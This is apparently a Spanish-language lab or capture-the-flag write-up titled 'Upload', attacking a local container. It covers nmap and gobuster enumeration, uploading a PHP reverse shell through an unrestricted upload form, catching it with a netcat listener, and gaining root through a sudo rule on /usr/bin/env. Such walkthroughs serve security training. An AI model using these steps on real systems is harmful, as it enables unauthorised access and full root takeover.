# Upload

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Como tenemos abierto el puerto 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p22,80`: Escaneo de los puertos 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Parece por el título que sea un sistema para subir un archivo y vamos a enumerar la página, mientras vemos lo que contiene, dejamos haciendo fuzzing con gobuster.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
```

En la página encontramos un sistema de subir archivos que probaremos a subir un archivo con una reverse shell, para obtener acceso a la máquina.

Vamos a ver que hemos encontrado con gobuster y vemos que tenemos un directorio en http://172.17.0.2/uploads/ que tiene pinta que es donde se subirán los archivos.

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 1361]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 1357]
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 1361]
/server-status        (Status: 403) [Size: 275]
```
## Explotación.

Ahora para subir la reverse shell vamos a https://github.com/pentestmonkey/php-reverse-shell y utilizamos la reverse-shell.php que han creado ellos que funciona muy bien. Solo hay que copiar el código en un archivo php en nuestro ordenador y sustituir la ip y el puerto en el que vamos a estar en escucha.
```bash
$ip = '172.17.0.1';  // CHANGE THIS
$port = 4443;       // CHANGE THIS
```

Subimos el archivo que terminamos de crear con la reverse shell y vemos que acepta archivos php.

Si vamos al directorio http://172.17.0.2/uploads/ vemos que nuestro archivo está subido y solo tendremos que hacer click sobre él y estar a la espera en nuestro equipo con netcat en puerto que habíamos indicado en el script.

```bash
nc -lvnp 4443
```

Y obtendremos la reverse shell directamente como el usuario data.
```bash
❯ nc -lvnp 4443
listening on [any] 4443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59230
Linux ebd3a0fc70ea 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 x86_64 x86_64 GNU/Linux
 12:14:20 up 42 min,  0 users,  load average: 0.06, 0.11, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$  
```
## Escalada de privilegios.

Ahora comprobamos empezamos la escalada de privilegios viendo si hay algún archivo con permisos sudo que podamos utilizar siendo el usuario www-data.

```bash
sudo -l
```

```bash
$ sudo -l
Matching Defaults entries for www-data on ebd3a0fc70ea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on ebd3a0fc70ea:
    (root) NOPASSWD: /usr/bin/env
$ 
```

Vemos que podemos utilizar el binario /usr/bin/env y para ello podemos ir a [GTFOBins](https://gtfobins.github.io/) y ver como explotar ese binario como muchos otros. En este caso simplemento tenemos que poner el siguiente comando.

```bash
sudo /usr/bin/env /bin/bash
```

Y con ello ya obtenemos una bash como root.
```bash
$ sudo /usr/bin/env /bin/bash
whoami
root
```

Para más comodidad podemos hacer un tratamiento de la tty.

```bash
script /dev/null -c bash
```

-- Hacemos Ctrl + Z --

```bash
stty -raw echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

```bash
root@ebd3a0fc70ea:/# whoami
whoami
root
root@ebd3a0fc70ea:/# 
```
